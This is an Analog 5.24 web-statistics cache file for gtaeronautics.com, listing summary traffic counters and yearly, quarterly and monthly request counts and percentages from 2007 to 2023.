x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2023	11	06	01	59
x	FR	2007	12	18	17	05
x	LR	2023	11	05	04	46
x	E7	2023	11	06	01	59
x	SR	1491607
x	S7	9669
x	NC	543354
x	C7	0
x	FL	548342
x	F7	577
x	RR	218
x	R7	0
x	NH	106142
x	H7	424
x	BT	57520368399
x	B7	0
1	Rr	398609	26.723	2023
1	Rr	82334	5.520	2022
1	Rr	98917	6.632	2021
1	Rr	89380	5.992	2020
1	Rr	80088	5.369	2019
1	Rr	68927	4.621	2018
1	Rr	60168	4.034	2017
1	Rr	73316	4.915	2016
1	Rr	80796	5.417	2015
1	Rr	110773	7.426	2014
1	Rr	65173	4.369	2013
1	Rr	60742	4.072	2012
1	Rr	57015	3.822	2011
1	Rr	22139	1.484	2010
1	Rr	69710	4.673	2009
1	Rr	71820	4.815	2008
1	Rr	1700	0.114	2007
1	*BT	R	398609	2023
Q	Rr	69669	4.671	2023	4
Q	Rr	165939	11.125	2023	3
Q	Rr	135306	9.071	2023	2
Q	Rr	27695	1.857	2023	1
Q	Rr	20307	1.361	2022	4
Q	Rr	20362	1.365	2022	3
Q	Rr	21795	1.461	2022	2
Q	Rr	19870	1.332	2022	1
Q	Rr	21154	1.418	2021	4
Q	Rr	26826	1.798	2021	3
Q	Rr	30675	2.057	2021	2
Q	Rr	20262	1.358	2021	1
Q	Rr	22199	1.488	2020	4
Q	Rr	23882	1.601	2020	3
Q	Rr	21656	1.452	2020	2
Q	Rr	21643	1.451	2020	1
Q	Rr	19098	1.280	2019	4
Q	Rr	19668	1.319	2019	3
Q	Rr	19827	1.329	2019	2
Q	Rr	21495	1.441	2019	1
Q	Rr	18129	1.215	2018	4
Q	Rr	17138	1.149	2018	3
Q	Rr	16928	1.135	2018	2
Q	Rr	16732	1.122	2018	1
Q	Rr	15937	1.068	2017	4
Q	Rr	0	0.000	2017	3
Q	Rr	16831	1.128	2017	2
Q	Rr	27400	1.837	2017	1
Q	Rr	22114	1.483	2016	4
Q	Rr	17621	1.181	2016	3
Q	Rr	15878	1.064	2016	2
Q	Rr	17703	1.187	2016	1
Q	Rr	16575	1.111	2015	4
Q	Rr	22104	1.482	2015	3
Q	Rr	22485	1.507	2015	2
Q	Rr	19632	1.316	2015	1
Q	Rr	21142	1.417	2014	4
Q	Rr	22272	1.493	2014	3
Q	Rr	31453	2.109	2014	2
Q	Rr	35906	2.407	2014	1
Q	Rr	16436	1.102	2013	4
Q	Rr	15216	1.020	2013	3
Q	Rr	16545	1.109	2013	2
Q	Rr	16976	1.138	2013	1
Q	Rr	16578	1.111	2012	4
Q	Rr	12511	0.839	2012	3
Q	Rr	15816	1.060	2012	2
Q	Rr	15837	1.062	2012	1
Q	Rr	15444	1.035	2011	4
Q	Rr	17386	1.166	2011	3
Q	Rr	9395	0.630	2011	2
Q	Rr	14790	0.992	2011	1
Q	Rr	1603	0.107	2010	4
Q	Rr	0	0.000	2010	3
Q	Rr	14047	0.942	2010	2
Q	Rr	6489	0.435	2010	1
Q	Rr	16350	1.096	2009	4
Q	Rr	18220	1.222	2009	3
Q	Rr	17115	1.147	2009	2
Q	Rr	18025	1.208	2009	1
Q	Rr	15905	1.066	2008	4
Q	Rr	15660	1.050	2008	3
Q	Rr	22448	1.505	2008	2
Q	Rr	17807	1.194	2008	1
Q	Rr	1700	0.114	2007	4
Q	*BT	R	165939	2023	3
m	Rr	3590	0.241	2023	11
m	Rr	66079	4.430	2023	10
m	Rr	51132	3.428	2023	09
m	Rr	54561	3.658	2023	08
m	Rr	60246	4.039	2023	07
m	Rr	66204	4.438	2023	06
m	Rr	60120	4.031	2023	05
m	Rr	8982	0.602	2023	04
m	Rr	10848	0.727	2023	03
m	Rr	8360	0.560	2023	02
m	Rr	8487	0.569	2023	01
m	Rr	6950	0.466	2022	12
m	Rr	6349	0.426	2022	11
m	Rr	7008	0.470	2022	10
m	Rr	6740	0.452	2022	09
m	Rr	6863	0.460	2022	08
m	Rr	6759	0.453	2022	07
m	Rr	6567	0.440	2022	06
m	Rr	8427	0.565	2022	05
m	Rr	6801	0.456	2022	04
m	Rr	6380	0.428	2022	03
m	Rr	6175	0.414	2022	02
m	Rr	7315	0.490	2022	01
m	Rr	7667	0.514	2021	12
m	Rr	7097	0.476	2021	11
m	Rr	6390	0.428	2021	10
m	Rr	6059	0.406	2021	09
m	Rr	9092	0.610	2021	08
m	Rr	11675	0.783	2021	07
m	Rr	10152	0.681	2021	06
m	Rr	10231	0.686	2021	05
m	Rr	10292	0.690	2021	04
m	Rr	7948	0.533	2021	03
m	Rr	5800	0.389	2021	02
m	Rr	6514	0.437	2021	01
m	Rr	8069	0.541	2020	12
m	Rr	6579	0.441	2020	11
m	Rr	7551	0.506	2020	10
m	Rr	8028	0.538	2020	09
m	Rr	7741	0.519	2020	08
m	Rr	8113	0.544	2020	07
m	Rr	7317	0.491	2020	06
m	Rr	6898	0.462	2020	05
m	Rr	7441	0.499	2020	04
m	Rr	7524	0.504	2020	03
m	Rr	7322	0.491	2020	02
m	Rr	6797	0.456	2020	01
m	Rr	6573	0.441	2019	12
m	Rr	5917	0.397	2019	11
m	Rr	6608	0.443	2019	10
m	Rr	6791	0.455	2019	09
m	Rr	6597	0.442	2019	08
m	Rr	6280	0.421	2019	07
m	Rr	6317	0.424	2019	06
m	Rr	6847	0.459	2019	05
m	Rr	6663	0.447	2019	04
m	Rr	7059	0.473	2019	03
m	Rr	6374	0.427	2019	02
m	Rr	8062	0.540	2019	01
m	Rr	6957	0.466	2018	12
m	Rr	5422	0.364	2018	11
m	Rr	5750	0.385	2018	10
m	Rr	5458	0.366	2018	09
m	Rr	5735	0.384	2018	08
m	Rr	5945	0.399	2018	07
m	Rr	7110	0.477	2018	06
m	Rr	6440	0.432	2018	05
